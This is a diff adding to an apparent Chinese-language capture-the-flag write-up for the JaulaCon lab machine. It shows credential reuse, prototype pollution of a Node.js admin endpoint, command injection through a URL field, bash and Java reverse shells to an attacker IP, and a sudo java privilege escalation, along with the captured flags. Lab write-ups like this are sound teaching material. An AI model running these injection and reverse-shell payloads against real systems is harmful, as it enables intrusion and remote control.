@@ -1,6 +1,6 @@
 # JaulaCon
 
-2025.03.07 https://thehackerslabs.com/jaulacon/
+2025.03.08 https://thehackerslabs.com/jaulacon/
 
 ## Ip
 
@@ -81,3 +81,69 @@ env x='() { :;}; echo Vulnerable' bash -c "echo This is a test"
 发现隐藏文件 /opt/.credenciales : `Shellychosk:Portidrea345ñ` 可能是 ssh 或者是 3333 那个登陆页面的用户凭据。不是 ssh 的，是 3333 端口的。
 
 登陆后，可以输入 url 下载文件，这里可能存在 SSRF。输入一个 http 请求，提示不是管理员，需要寻找提升到管理员的方法。
+
+3333 对应的 web 服务是 Node.js 搭建的，可能存在 Prototype Pollution。利用过程如下：
+
+1. 先使用上面的用户凭据登陆，然后获得 cookie 中的 admin_session 值:
+
+```
+curl -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=Shellychosk&password=Portidrea345ñ' http://192.168.5.40:3333/login -v
+
+admin_session=e4ad770982de667ccfcb380c13a87bc30f0e1e91bca7a223ff9461345507672a4b4f255db1925f0bb06f1153496e3ecca34b28e168c42addeb094e7ea21ed2f2
+```
+
+2. 进行原型链污染，会返回 Forbidden:
+
+```
+curl -X POST -H 'Content-Type: application/json' -d '{"url":1,"__proto__":{"admin":"true","isAdmin":"true","isadmin":"true"}}' http://192.168.5.40:3333/admin/check_url -v
+```
+
+3. 再次访问 check_url，这时系统内部的属性已经变成 admin，执行后会显示 File Downloaded：
+
+```
+curl -X POST -b 'admin_session=e4ad770982de667ccfcb380c13a87bc30f0e1e91bca7a223ff9461345507672a4b4f255db1925f0bb06f1153496e3ecca34b28e168c42addeb094e7ea21ed2f2' -H 'Content-Type: application/json' -d '{"url":1,"__proto__":{"admin":"true","isAdmin":"true","isadmin":"true"}}' http://192.168.5.40:3333/admin/check_url -v
+```
+
+4. 执行命令验证(猜测目标机器上使用的是 Node.js 中的 exec 执行的系统命令，并且使用的是 wget url -O 这种形式进行的下载，url 现在可控，需要把前面和后面必合掉才能执行自己的命令)：
+
+```
+curl -X POST -b 'admin_session=e4ad770982de667ccfcb380c13a87bc30f0e1e91bca7a223ff9461345507672a4b4f255db1925f0bb06f1153496e3ecca34b28e168c42addeb094e7ea21ed2f2' -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'url=; ping -c 5 192.168.5.3 #' http://192.168.5.40:3333/admin/check_url -v
+```
+
+5. 执行反弹 shell
+
+```
+curl -X POST -b 'admin_session=e4ad770982de667ccfcb380c13a87bc30f0e1e91bca7a223ff9461345507672a4b4f255db1925f0bb06f1153496e3ecca34b28e168c42addeb094e7ea21ed2f2' -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'url=; /bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.5.3/8888 0>&1" #' http://192.168.5.40:3333/admin/check_url -v
+```
+
+得到了反弹的 shell，在用户 jaula 下拿到了 user flag：
+
+```
+jaula@JaulaCon:~$ cat user.txt
+3ac6640322d7d06957d3773fab3b27b7
+```
+
+sudo -l 显示 (root) NOPASSWD: /usr/bin/java 直接提权到 root：
+
+创建 shell.java 文件：
+
+```
+public class shell {
+    public static void main(String[] args) {
+        ProcessBuilder pb = new ProcessBuilder("bash", "-c", "$@| bash -i >& /dev/tcp/192.168.5.3/8888 0>&1")
+            .redirectErrorStream(true);
+        try {
+            Process p = pb.start();
+            p.waitFor();
+            p.destroy();
+        } catch (Exception e) {}
+    }
+}
+```
+
+javac shell.java & java shell 在 kali 上监听 8888 得到反弹的 shell，读取到最终的 root flag：
+
+```
+root@JaulaCon:~# cat root.txt
+bdc7c8e1ce71e0ebff2d76d9b58c9b74
+```
